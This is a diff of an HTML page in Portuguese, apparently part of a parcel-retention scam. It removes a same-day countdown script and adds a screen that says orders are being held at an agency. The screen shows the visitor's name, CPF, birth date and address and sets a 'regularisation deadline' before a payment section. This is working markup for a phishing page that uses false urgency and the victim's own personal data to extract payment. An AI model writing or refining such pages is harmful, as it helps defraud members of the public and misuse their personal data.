@@ -632,47 +632,24 @@
       </form>
     </section>
 
-    <script>
-  // Function to update the countdown
-  function atualizarContagemRegressiva() {
-    const prazoElement = document.getElementById('res-prazo');
-    const now = new Date();
-    
-    // Format current date as DD/MM/YYYY
-    const day = String(now.getDate()).padStart(2, '0');
-    const month = String(now.getMonth() + 1).padStart(2, '0');
-    const year = now.getFullYear();
-    const formattedDate = `${day}/${month}/${year}`;
-    
-    // Set end time to 23:59:59 of current day
-    const endOfDay = new Date();
-    endOfDay.setHours(23, 59, 59, 0);
-    
-    // Calculate time remaining
-    const diff = endOfDay - now;
-    
-    if (diff <= 0) {
-      prazoElement.textContent = "Prazo expirado";
-      return;
-    }
-    
-    // Convert milliseconds to hours, minutes, seconds
-    const hours = Math.floor(diff / (1000 * 60 * 60));
-    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-    
-    // Update the display
-    prazoElement.innerHTML = `${formattedDate} às 23:59<br><span style="color: red;">${hours}h ${minutes}m ${seconds}s restantes</span>`;
-    
-    // Update every second
-    setTimeout(atualizarContagemRegressiva, 1000);
-  }
+    <!-- Tela Resultado -->
+<section id="resultado" style="text-align: center; font-family: Arial, sans-serif;">
+  <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
+  <p><span style="font-weight: normal; color: black;">Nome:</span> <span id="res-nome" style="font-weight: bold; color: black;"></span></p>
+  <p><span style="font-weight: normal; color: black;">CPF:</span> <span id="res-cpf" style="font-weight: bold; color: black;"></span></p>
+  <p><span style="font-weight: normal; color: black;">Nascimento:</span> <span id="res-nascimento" style="font-weight: bold; color: black;"></span></p>
+  <p><span style="font-weight: normal; color: black;">CEP:</span> <span id="res-cep" style="font-weight: bold; color: black;"></span></p>
+  <p><span style="font-weight: normal; color: black;">Rua:</span> <span id="res-rua" style="font-weight: bold; color: black;"></span></p>
+  <p><span style="font-weight: normal; color: black;">Bairro:</span> <span id="res-bairro" style="font-weight: bold; color: black;"></span></p>
+  <p><span style="font-weight: normal; color: black;">Cidade:</span> <span id="res-cidade" style="font-weight: bold; color: black;"></span></p>
+  <p><span style="font-weight: normal; color: black;">Estado:</span> <span id="res-estado" style="font-weight: bold; color: black;"></span></p>
+  <p><span style="font-weight: normal; color: black;">Prazo para Regularização:</span> <span id="res-prazo" style="color: black; font-weight: bold;"></span></p>
 
-  // Start the countdown when the page loads (or when results are shown)
-  document.addEventListener('DOMContentLoaded', function() {
-    atualizarContagemRegressiva();
-  });
-</script>
+  <div class="btn-container">
+    <button id="btn-sim-sou-eu">SIM SOU EU</button>
+    <a href="#" id="nao-sou-eu">não sou eu</a>
+  </div>
+</section>
 
     <!-- Tela Pagamento - MODIFICADA PARA LARGURA MAIOR -->
     <section id="pagamento">
@@ -1044,4 +1021,3 @@
 </body>
 
 </html>
-
